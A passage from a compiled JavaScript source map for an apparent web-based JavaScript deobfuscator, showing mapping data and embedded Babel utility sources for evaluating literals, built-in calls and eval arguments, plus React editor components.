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","file":"static/js/main.667c3fa1.chunk.js","sourcesContent":["\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nfunction hasValue(node) {\n    if (!t.isExpression(node)) {\n        return false;\n    }\n    if (t.isLiteral(node)) {\n        if (t.isRegExpLiteral(node)) {\n            node['value'] = new RegExp(node.pattern, node.flags);\n        }\n        if (t.isNullLiteral(node)) {\n            node['value'] = null;\n        }\n        return true;\n    }\n    if (t.isArrayExpression(node)) {\n        if (node.elements.every(function (e) { return t.isExpression(e) && hasValue(e); })) {\n            node['value'] = node.elements.map(function (e) { return e['value']; });\n            return true;\n        }\n    }\n    if (t.isIdentifier(node)) {\n        if (node.name === 'undefined') {\n            node['value'] = undefined;\n            return true;\n        }\n        else if (node.name === 'NaN') {\n            node['value'] = NaN;\n            return true;\n        }\n    }\n    return false;\n}\nexports.hasValue = hasValue;\nfunction withValues(expressions) {\n    return expressions.every(function (arg) { return hasValue(arg); }) ? expressions : null;\n}\nexports.withValues = withValues;\nfunction isNumeric(object) {\n    return !isNaN(object - parseFloat(object));\n}\nexports.isNumeric = isNumeric;\n// TODO Template literals?\nfunction someLiteral(value) {\n    var node = (function () {\n        switch (typeof value) {\n            case 'undefined': return t.identifier('undefined');\n            case 'boolean': return t.booleanLiteral(value);\n            case 'string': return t.stringLiteral(value);\n            case 'number': return t.numericLiteral(value);\n            case 'object':\n                if (Array.isArray(value)) {\n                    var values = value.map(someLiteral);\n                    return t.arrayExpression(values);\n                }\n                else if (value instanceof RegExp) {\n                    return t.regExpLiteral(value.source, value['flags']);\n                }\n                return t.nullLiteral();\n            default: return null;\n        }\n    })();\n    if (node) {\n        node['value'] = value;\n        return node;\n    }\n    return null;\n}\nexports.someLiteral = someLiteral;\nfunction isAssignmentExpressionStatement(statement) {\n    t.assertStatement(statement);\n    return t.isExpressionStatement(statement) &&\n        t.isAssignmentExpression(statement.expression, { operator: '=' }) &&\n        t.isIdentifier(statement.expression.left);\n}\nexports.isAssignmentExpressionStatement = isAssignmentExpressionStatement;\n/**\n * This could be done symbolically if it makes for better de-obfuscation.\n * I.e. generate a binary expression node instead of a literal.\n */\nfunction assignmentValue(operator, oldValue, value) {\n    switch (operator) {\n        case '=': return value;\n        case '+=': return oldValue + value;\n        case '-=': return oldValue - value;\n        case '*=': return oldValue * value;\n        case '/=': return oldValue / value;\n        default: throw new Error('Unexpected operator in assignment: ' + operator);\n    }\n}\nexports.assignmentValue = assignmentValue;\n/**\n * This could be done symbolically if it makes for better de-obfuscation.\n * I.e. generate a binary expression node instead of a literal.\n */\nfunction updateValue(operator, value) {\n    switch (operator) {\n        case '++': return value + 1;\n        case '--': return value - 1;\n        default: throw new Error('Unexpected operator in update expression: ' + operator);\n    }\n}\nexports.updateValue = updateValue;\n/** Find paths where a property gets assigned. */\nfunction getMemberAssignments(binding, option) {\n    return binding.referencePaths\n        .map(function (p) { return p.parentPath; })\n        .filter(function (p) { return t.isAssignmentExpression(p.parent) && p.key === 'left'; })\n        .filter(function (p) { return option ? p.node.property.value === option.propertyValue : true; })\n        .map(function (p) { return p.parentPath; });\n}\nexports.getMemberAssignments = getMemberAssignments;\n//# sourceMappingURL=utils.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar globalFunctions = new Set([\n    'isFinite',\n    'isNaN',\n    'parseFloat',\n    'parseInt',\n    'decodeURI',\n    'decodeURIComponent',\n    'encodeURI',\n    'encodeURIComponent',\n    'escape',\n    'unescape'\n]);\nfunction isEvaluableGlobalFunctionCall(functionName) {\n    return globalFunctions.has(functionName);\n}\nexports.isEvaluableGlobalFunctionCall = isEvaluableGlobalFunctionCall;\nvar evaluableStaticFunctions = {\n    String: new Set(['fromCharCode'])\n};\nfunction isEvaluableStaticFunctionCall(call, object) {\n    if (!t.isCallExpression(call) ||\n        !t.isMemberExpression(call.callee) ||\n        !t.isIdentifier(call.callee.property) ||\n        !t.isIdentifier(object)) {\n        t.assertCallExpression(call);\n        return false;\n    }\n    var functions = evaluableStaticFunctions[object.name];\n    return functions && functions.has(call.callee.property.name);\n}\nexports.isEvaluableStaticFunctionCall = isEvaluableStaticFunctionCall;\nvar arrayMutatorMethods = new Set(['fill', 'pop', 'push', 'reverse', 'shift', 'sort', 'splice', 'unshift']);\nfunction isArrayMutatorFunctionCall(call) {\n    if (!t.isCallExpression(call) ||\n        !t.isMemberExpression(call.callee) ||\n        !t.isIdentifier(call.callee.property)) {\n        t.assertCallExpression(call);\n        return false;\n    }\n    return arrayMutatorMethods.has(call.callee.property.name);\n}\nexports.isArrayMutatorFunctionCall = isArrayMutatorFunctionCall;\nvar evaluableInstanceFunctions = {\n    number: new Set(['toString']),\n    string: new Set(['replace', 'charAt', 'charCodeAt', 'indexOf', 'toLowerCase', 'toUpperCase', 'split', 'substring']),\n    array: new Set(['toString', 'indexOf', 'join'])\n};\n/** Check if callee and argument values required for evaluation are available */\nfunction isEvaluableInstanceFunctionCall(call, object, allowMutators) {\n    if (!t.isCallExpression(call) ||\n        !t.isMemberExpression(call.callee) ||\n        !t.isIdentifier(call.callee.property) ||\n        !u.hasValue(object)) {\n        return false;\n    }\n    var evaluables = new Set();\n    if (typeof object.value === 'number') {\n        evaluables = evaluableInstanceFunctions.number;\n    }\n    else if (typeof object.value === 'string') {\n        evaluables = evaluableInstanceFunctions.string;\n    }\n    else if (Array.isArray(object.value)) {\n        evaluables = allowMutators ? union(evaluableInstanceFunctions.array, arrayMutatorMethods) : evaluableInstanceFunctions.array;\n    }\n    return evaluables.has(call.callee.property.name);\n}\nexports.isEvaluableInstanceFunctionCall = isEvaluableInstanceFunctionCall;\nfunction union(lhs, rhs) {\n    var union = new Set(lhs);\n    rhs.forEach(function (e) { return union.add(e); });\n    return union;\n}\n//# sourceMappingURL=built-ins.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar babylon = require(\"babylon\");\nvar u = require(\"./utils\");\nvar builtIns = require(\"./built-ins\");\nvar functions = require(\"./functions\");\nvar expressions_1 = require(\"./expressions\");\n/** Evaluate or inline a call expression. */\nfunction evaluate(path) {\n    path.assertCallExpression();\n    var result = null;\n    var callee = path.node.callee;\n    if (t.isMemberExpression(callee) && t.isIdentifier(callee.object, { name: 'window' })) {\n        var property = expressions_1.evaluateExpression(path.get('callee.property'));\n        if (t.isStringLiteral(property)) {\n            callee = t.identifier(property.value);\n            result = t.callExpression(callee, path.node.arguments);\n        }\n    }\n    if (t.isMemberExpression(callee)) {\n        if (t.isThisExpression(callee.object)) {\n            var property = expressions_1.evaluateExpression(path.get('callee.property'));\n            result = evaluateThisMemberCall(path, property);\n        }\n        else {\n            var object = expressions_1.evaluateExpression(path.get('callee.object'));\n            result = evaluateMemberCall(path, object);\n        }\n    }\n    else if (t.isFunction(callee)) {\n        var paramBindings = evaluateParamBindings(path, callee);\n        result = functions.evaluate(path.get('callee'), paramBindings);\n    }\n    else if (t.isIdentifier(callee)) {\n        result = evaluateFunctionCall(path, callee);\n    }\n    return result;\n}\nexports.evaluate = evaluate;\n/** Inline if the function is a procedure, called inside a statement, only for its side-effects. */\nfunction inlineProcedure(path, traverse) {\n    path.assertCallExpression();\n    if (!t.isIdentifier(path.node.callee) || !path.parentPath.isExpressionStatement()) {\n        return;\n    }\n    var functionDeclaration = getFunctionDeclaration(path, path.node.callee.name);\n    if (!functionDeclaration) {\n        return;\n    }\n    var bodyStatements = functionDeclaration.node.body.body;\n    var returnStatements = bodyStatements.filter(function (s) { return t.isReturnStatement(s); });\n    if (returnStatements.length !== 0) {\n        return;\n    }\n    var params = functionDeclaration.node.params;\n    if (hasShadowing(path.scope, params)) {\n        return;\n    }\n    if (params.length > 0) {\n        // Replace procedure parameters\n        var args_1 = params.map(function (p, i) { return path.node.arguments[i] || t.identifier('undefined'); });\n        var procedure = babylon.parse(functionDeclaration.get('body').getSource());\n        traverse(procedure, {\n            Identifier: function (path) {\n                params.forEach(function (p, i) {\n                    if (path.node.name === p.name) {\n                        path.replaceWith(args_1[i]);\n                    }\n                });\n            }\n        });\n        replaceWithStatements(procedure.program.body[0].body);\n    }\n    else {\n        replaceWithStatements(bodyStatements);\n    }\n    function replaceWithStatements(statements) {\n        var functionBinding = path.scope.getBinding(path.node.callee.name);\n        functionBinding.referencePaths = functionBinding.referencePaths.filter(function (p) { return p !== path.get('callee'); });\n        functionBinding.dereference();\n        traverse(statements, {\n            Identifier: function (path) {\n                var binding = path.scope.getBinding(path.node.name);\n                if (binding) {\n                    binding.reference(path);\n                }\n            }\n        }, path.scope);\n        path.replaceWithMultiple(statements);\n    }\n}\nexports.inlineProcedure = inlineProcedure;\n/** Returns `true` if inlining `indentifiers` into `targetScope` would cause indentifiers to clash. */\nfunction hasShadowing(targetScope, indentifiers) {\n    return indentifiers.map(function (p) { return p.name; }).some(function (name) { return targetScope.getBinding(name); });\n}\nfunction evaluateFunctionCall(path, callee) {\n    t.assertIdentifier(callee);\n    var args = functions.evaluatedArguments(path);\n    if (callee.name === 'eval' && args.length === 1 && u.hasValue(args[0])) {\n        return evaluateEvalCall(path, args[0]['value']);\n    }\n    var functionDeclaration = getFunctionDeclaration(path, callee.name);\n    if (functionDeclaration) {\n        var paramBindings = evaluateParamBindings(path, functionDeclaration.node);\n        return functions.evaluate(functionDeclaration, paramBindings);\n    }\n    return evaluateGlobalFunction(callee, args);\n}\nfunction evaluateGlobalFunction(callee, args) {\n    if (builtIns.isEvaluableGlobalFunctionCall(callee.name)) {\n        var argumentValues = u.withValues(args);\n        if (argumentValues) {\n            return u.someLiteral(global[callee.name].apply(global, argumentValues.map(function (a) { return a.value; })));\n        }\n    }\n    return null;\n}\nfunction evaluateMemberCall(path, object) {\n    var call = path.node;\n    var args = functions.evaluatedArguments(path);\n    if (isEvaluableReplaceWithFunctionArgument(call, object, args[0])) {\n        return evaluateReplaceWithFunctionArgumentResult(path, object, args[0]);\n    }\n    var argumentsWithValues = u.withValues(args);\n    if (!argumentsWithValues) {\n        return null;\n    }\n    // Allow mutators if the object is an expression that will be discarded. I.e. chained calls or literal objects.\n    var allowMutators = t.isCallExpression(path.node.callee.object) || u.hasValue(path.node.callee.object);\n    if (builtIns.isEvaluableInstanceFunctionCall(call, object, allowMutators)) {\n        return evaluateInstanceFunctionCall(call, object, argumentsWithValues);\n    }\n    else if (builtIns.isEvaluableStaticFunctionCall(call, object)) {\n        return evaluateStaticFunctionCall(call, object, argumentsWithValues);\n    }\n    return null;\n}\nfunction evaluateThisMemberCall(path, property) {\n    if (!u.hasValue(property)) {\n        return null;\n    }\n    var functionDeclaration = getFunctionDeclaration(path, property.value.toString());\n    if (!functionDeclaration) {\n        return null;\n    }\n    var paramBindings = evaluateParamBindings(path, functionDeclaration.node);\n    return functions.evaluate(functionDeclaration, paramBindings);\n}\nfunction getFunctionDeclaration(path, name) {\n    var binding = path.scope.getBinding(name);\n    if (binding && t.isFunctionDeclaration(binding.path.node)) {\n        return binding.path;\n    }\n    return null;\n}\nfunction isEvaluableReplaceWithFunctionArgument(call, object, patternArgument) {\n    return u.hasValue(object) &&\n        t.isMemberExpression(call.callee) &&\n        call.callee.property['name'] === 'replace' &&\n        call.arguments.length === 2 &&\n        u.hasValue(patternArgument) &&\n        t.isFunction(call.arguments[1]);\n}\n/** Fairly aggressive evaluation that can be incorrect if member functions are overriden in the input code. */\nfunction evaluateInstanceFunctionCall(call, object, _arguments) {\n    t.assertCallExpression(call);\n    t.assertMemberExpression(call.callee);\n    try {\n        var objectValue = object.value;\n        var functionName = call.callee.property['name'];\n        var argumentValues = _arguments.map(function (arg) { return arg.value; });\n        var result = objectValue[functionName].apply(objectValue, argumentValues);\n        return u.someLiteral(result);\n    }\n    catch (e) {\n        console.warn(e);\n        return call;\n    }\n}\nfunction evaluateStaticFunctionCall(call, object, _arguments) {\n    t.assertCallExpression(call);\n    t.assertMemberExpression(call.callee);\n    try {\n        var staticObject = global[object.name];\n        var functionName = call.callee.property.name;\n        var argumentValues = _arguments.map(function (arg) { return arg.value; });\n        var result = staticObject[functionName].apply(staticObject, argumentValues);\n        return u.someLiteral(result);\n    }\n    catch (e) {\n        console.warn(e);\n        return call;\n    }\n}\n/**\n * Allows for function as second argument.\n * This can't resolve nested functions. Nodes can't be replaced since the parameter bindings\n * are different as the function is called multiple times. Therefore we can't recursively traverse the function argument.\n */\nfunction evaluateReplaceWithFunctionArgumentResult(path, object, patternArgument) {\n    path.assertCallExpression();\n    var bail = false;\n    var result = object.value.replace(patternArgument.value, function () {\n        var replaceArguments = [];\n        for (var _i = 0; _i < arguments.length; _i++) {\n            replaceArguments[_i] = arguments[_i];\n        }\n        if (bail) {\n            return '';\n        }\n        var replacementFunctionArgument = path.get('arguments.1');\n        var paramBindings = replacementFunctionArgument.node.params\n            .map(function (param, i) {\n            var _a;\n            return (_a = {}, _a[param.name] = replaceArguments[i], _a);\n        })\n            .reduce(Object.assign, {});\n        var result = functions.evaluate(replacementFunctionArgument, paramBindings);\n        if (result && u.hasValue(result)) {\n            return result.value;\n        }\n        else {\n            bail = true;\n            console.warn('Can\\'t evaluate string replace: ', path.getSource());\n            return '';\n        }\n    });\n    if (bail) {\n        return path.node;\n    }\n    return u.someLiteral(result) || path.node;\n}\nfunction evaluateEvalCall(path, argument) {\n    try {\n        var ast = babylon.parse(argument);\n        return ast.program.body;\n    }\n    catch (e) {\n        console.warn('Could not parse eval argument: ' + argument);\n        return null;\n    }\n}\nfunction evaluateParamBindings(callPath, functionExpression) {\n    callPath.assertCallExpression();\n    var args = u.withValues(functions.evaluatedArguments(callPath));\n    if (!args) {\n        return {};\n    }\n    return functionExpression.params\n        .map(function (p, i) {\n        var _a;\n        var value = args[i] ? args[i].value : undefined;\n        return _a = {}, _a[p['name']] = value, _a;\n    })\n        .reduce(Object.assign, {});\n}\n//# sourceMappingURL=call-expressions.js.map","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar u = require(\"./utils\");\nvar expressions_1 = require(\"./expressions\");\n/** Using param bindings, infer more bindings */\nvar bindingInferrer = function () { return ({\n    VariableDeclarator: function (path) {\n        var evaluated = expressions_1.evaluateExpression(path.get('init'));\n        var binding = path.scope.getBinding(path.node.id.name);\n        if (evaluated && u.hasValue(evaluated)) {\n            